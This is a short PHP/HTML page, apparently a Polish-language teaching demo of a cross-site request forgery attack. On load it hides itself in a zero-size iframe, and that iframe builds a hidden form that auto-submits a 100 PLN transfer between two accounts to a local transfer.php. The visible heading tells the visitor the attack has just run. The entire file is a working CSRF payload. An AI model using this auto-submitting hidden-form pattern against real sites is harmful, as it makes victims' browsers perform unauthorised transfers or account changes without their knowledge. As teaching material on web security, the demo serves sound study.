<html>
<head>
    <title>Przykład ataku CSRF</title>
    <meta charset="UTF-8">
</head>
<body>
    <?php if (isset($_GET['iframe'])): ?>
        <script>
            document.write('<form id="transfer" action="http://localhost/transfer.php" method="post">');
            document.write('<input type="hidden" name="fromAccount" value="1" />');
            document.write('<input type="hidden" name="toAccount" value="4" />');
            document.write('<input type="hidden" name="amount" value="100" />');
            document.write('</form>');

            document.getElementById('transfer').submit();
        </script>
    <?php endif; ?>

    <h1>Właśnie wykonałeś atak CSRF stan konta został zmniejszony o 100 PLN</h1>

    <iframe src="csrf.html.php?iframe&t=<?php echo microtime() ?>" style="width: 0; height: 0;" />

</body>
</html>